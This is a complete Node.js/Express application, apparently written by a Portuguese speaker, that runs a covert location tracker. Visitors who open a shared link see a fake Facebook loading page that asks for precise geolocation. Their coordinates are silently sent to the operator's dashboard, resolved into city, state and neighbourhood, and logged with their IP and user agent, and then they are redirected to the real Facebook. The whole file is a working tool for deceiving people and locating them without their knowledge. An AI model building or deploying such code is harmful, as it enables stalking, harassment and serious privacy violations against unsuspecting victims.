const express = require('express');
const https = require('https');
const http = require('http');
const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());

const clicks = [];

// Função para requisições HTTP/HTTPS
function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https') ? https : http;
    const options = {
      headers: {
        'User-Agent': 'Mozilla/5.0 (compatible; LocationTracker/1.0)'
      }
    };
    
    lib.get(url, options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    }).on('error', reject);
  });
}

// Captura IP real
function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
}

// Dashboard principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Dashboard GPS</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          border-radius: 15px;
          padding: 30px;
          margin-bottom: 20px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #667eea; margin-bottom: 10px; }
        .link-box {
          background: #e3f2fd;
          padding: 15px;
          border-radius: 8px;
          margin-top: 15px;
          border: 2px dashed #667eea;
        }
        .link-box code {
          background: white;
          padding: 10px 15px;
          border-radius: 5px;
          display: block;
          margin: 10px 0;
          color: #667eea;
          font-weight: bold;
          word-break: break-all;
        }
        .btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 10px 25px;
          border-radius: 20px;
          cursor: pointer;
          font-size: 0.95em;
          margin-top: 10px;
        }
        .btn:hover { background: #5568d3; }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 20px;
        }
        .stat-card {
          background: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 5px 15px rgba(0,0,0,0.1);
          text-align: center;
        }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
        .stat-label { color: #666; margin-top: 5px; }
        .clicks-container {
          background: white;
          border-radius: 15px;
          padding: 30px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .click-item {
          background: #f8f9fa;
          border-left: 4px solid #28a745;
          padding: 20px;
          margin-bottom: 15px;
          border-radius: 8px;
        }
        .click-item.no-gps {
          border-left-color: #ffc107;
          background: #fff9e6;
        }
        .click-time { 
          font-weight: bold; 
          color: #667eea; 
          font-size: 1.2em; 
          margin-bottom: 15px; 
        }
        .click-info { 
          color: #333; 
          margin: 10px 0; 
          line-height: 1.8; 
          font-size: 1em;
        }
        .badge {
          display: inline-block;
          padding: 6px 14px;
          border-radius: 15px;
          font-size: 0.85em;
          font-weight: bold;
          margin: 10px 0;
        }
        .badge-success { background: #28a745; color: white; }
        .badge-warning { background: #ffc107; color: #333; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📍 Rastreador GPS</h1>
          <p>Captura localização via GPS</p>
          <div class="link-box">
            <strong>🔗 Link de Rastreamento:</strong>
            <code id="trackingLink">Carregando...</code>
            <button class="btn" onclick="copyLink()">📋 Copiar Link</button>
          </div>
        </div>
        
        <div class="stats">
          <div class="stat-card">
            <div class="stat-number" id="totalClicks">0</div>
            <div class="stat-label">Total de Cliques</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="gpsClicks">0</div>
            <div class="stat-label">Com GPS</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="noGpsClicks">0</div>
            <div class="stat-label">Sem GPS</div>
          </div>
        </div>
        
        <div class="clicks-container">
          <button class="btn" onclick="loadData()">🔄 Atualizar</button>
          <h2 style="margin:20px 0;">📋 Últimos Cliques</h2>
          <div id="clicksList">Carregando...</div>
        </div>
      </div>
      
      <script>
        const trackingUrl = window.location.origin + '/track';
        document.getElementById('trackingLink').textContent = trackingUrl;
        
        function copyLink() {
          navigator.clipboard.writeText(trackingUrl);
          alert('✅ Link copiado!');
        }
        
        async function loadData() {
          try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            
            document.getElementById('totalClicks').textContent = data.total;
            
            const gpsClicks = data.clicks.filter(c => c.location && c.location.cidade);
            document.getElementById('gpsClicks').textContent = gpsClicks.length;
            
            const noGpsClicks = data.clicks.filter(c => !c.location || !c.location.cidade);
            document.getElementById('noGpsClicks').textContent = noGpsClicks.length;
            
            const container = document.getElementById('clicksList');
            
            if (data.clicks.length === 0) {
              container.innerHTML = '<p style="text-align:center; color:#999; padding:40px;">📭 Nenhum clique ainda</p>';
              return;
            }
            
            container.innerHTML = data.clicks.map(c => {
              const date = new Date(c.timestamp).toLocaleString('pt-BR', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
              });
              
              const hasGPS = c.location && c.location.cidade && c.location.cidade !== 'Processando...';
              const itemClass = hasGPS ? 'click-item' : 'click-item no-gps';
              
              let content = '';
              if (hasGPS) {
                const loc = c.location;
                content = \`
                  <div class="badge badge-success">✅ GPS ATIVADO</div>
                  <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.cidade}</div>
                  <div class="click-info">📍 <strong>Estado:</strong> \${loc.estado}</div>
                  \${loc.bairro && loc.bairro !== 'N/A' && loc.bairro !== 'undefined' ? \`
                    <div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.bairro}</div>
                  \` : ''}
                \`;
              } else if (c.location && c.location.cidade === 'Processando...') {
                content = \`
                  <div class="badge badge-warning">⏳ PROCESSANDO</div>
                  <div class="click-info">Aguardando resposta da API...</div>
                \`;
              } else {
                content = \`
                  <div class="badge badge-warning">⚠️ GPS NEGADO</div>
                  <div class="click-info">Usuário não permitiu localização</div>
                \`;
              }
              
              return \`
                <div class="\${itemClass}">
                  <div class="click-time">⏰ \${date}</div>
                  \${content}
                </div>
              \`;
            }).join('');
          } catch (error) {
            console.error('Erro:', error);
          }
        }
        
        loadData();
        setInterval(loadData, 3000);
      </script>
    </body>
    </html>
  `);
});

// Página de rastreamento
app.get('/track', async (req, res) => {
  const ip = getIP(req);
  const userAgent = req.headers['user-agent'] || 'Desconhecido';
  
  const clickData = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    ip: ip,
    userAgent: userAgent,
    location: null
  };
  
  clicks.push(clickData);
  
  console.log('');
  console.log('🎯 NOVO CLIQUE');
  console.log('Hora:', new Date().toLocaleString('pt-BR'));
  
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Carregando...</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          margin: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: #1877f2;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        .container {
          text-align: center;
          color: white;
          padding: 20px;
        }
        .logo {
          font-size: 80px;
          font-weight: bold;
          margin-bottom: 20px;
        }
        h2 {
          font-size: 20px;
          font-weight: 400;
          margin-bottom: 15px;
        }
        .message {
          font-size: 14px;
          opacity: 0.9;
          margin-bottom: 30px;
        }
        .loader {
          border: 4px solid rgba(255,255,255,0.3);
          border-top: 4px solid white;
          border-radius: 50%;
          width: 40px;
          height: 40px;
          animation: spin 0.8s linear infinite;
          margin: 0 auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="logo">f</div>
        <h2 id="status">Carregando...</h2>
        <div class="message" id="message">Aguarde um momento</div>
        <div class="loader"></div>
      </div>
      
      <script>
        const clickId = ${clickData.id};
        let redirected = false;
        
        function redirect() {
          if (!redirected) {
            redirected = true;
            setTimeout(() => {
              window.location.href = 'https://www.facebook.com/';
            }, 500);
          }
        }
        
        if (!navigator.geolocation) {
          setTimeout(redirect, 1000);
        } else {
          const timeout = setTimeout(() => {
            if (!redirected) redirect();
          }, 10000);
          
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              clearTimeout(timeout);
              
              try {
                await fetch('/api/save-gps', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({
                    clickId: clickId,
                    lat: position.coords.latitude,
                    lng: position.coords.longitude
                  })
                });
              } catch (error) {
                console.error('Erro:', error);
              }
              
              redirect();
            },
            (error) => {
              clearTimeout(timeout);
              redirect();
            },
            {
              enableHighAccuracy: true,
              timeout: 8000,
              maximumAge: 0
            }
          );
        }
      </script>
    </body>
    </html>
  `);
});

// Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  try {
    const { clickId, lat, lng } = req.body;
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      return res.json({ success: false });
    }
    
    if (!lat || !lng) {
      return res.json({ success: false });
    }
    
    console.log('  📍 GPS:', lat, lng);
    
    // Marca como processando
    click.location = {
      cidade: 'Processando...',
      estado: 'Processando...',
      bairro: 'N/A'
    };
    
    // Busca endereço usando API do BigDataCloud (gratuita, sem limite)
    try {
      const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=pt`;
      const data = await fetchJSON(url);
      
      if (data) {
        click.location = {
          cidade: data.city || data.locality || data.localityInfo?.administrative?.[3]?.name || 'Não identificada',
          estado: data.principalSubdivision || 'Não identificado',
          bairro: data.localityInfo?.administrative?.[0]?.name || 'N/A'
        };
        
        console.log('  ✅ Localização:', click.location.cidade, '-', click.location.estado);
      }
    } catch (error) {
      console.error('  ❌ Erro API:', error.message);
      
      // Tenta API alternativa (geocode.xyz)
      try {
        await new Promise(resolve => setTimeout(resolve, 1000)); // Delay de 1 segundo
        const url2 = `https://geocode.xyz/${lat},${lng}?json=1`;
        const data2 = await fetchJSON(url2);
        
        if (data2 && data2.city) {
          click.location = {
            cidade: data2.city || 'Não identificada',
            estado: data2.state || data2.region || 'Não identificado',
            bairro: 'N/A'
          };
          console.log('  ✅ Localização (API 2):', click.location.cidade, '-', click.location.estado);
        }
      } catch (error2) {
        console.error('  ❌ Erro API 2:', error2.message);
        click.location = {
          cidade: 'Erro ao buscar',
          estado: 'Erro',
          bairro: 'N/A'
        };
      }
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Erro geral:', error);
    res.json({ success: false });
  }
});

// API de estatísticas
app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: clicks.slice().reverse()
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK',
    uptime: process.uptime(),
    clicks: clicks.length
  });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('========================================');
  console.log('✅ RASTREADOR GPS ONLINE');
  console.log('========================================');
  console.log('🌐 Porta:', PORT);
  console.log('📍 Captura: Cidade, Estado e Bairro');
  console.log('🔗 Redirect: Facebook');
  console.log('========================================');
  console.log('');
});
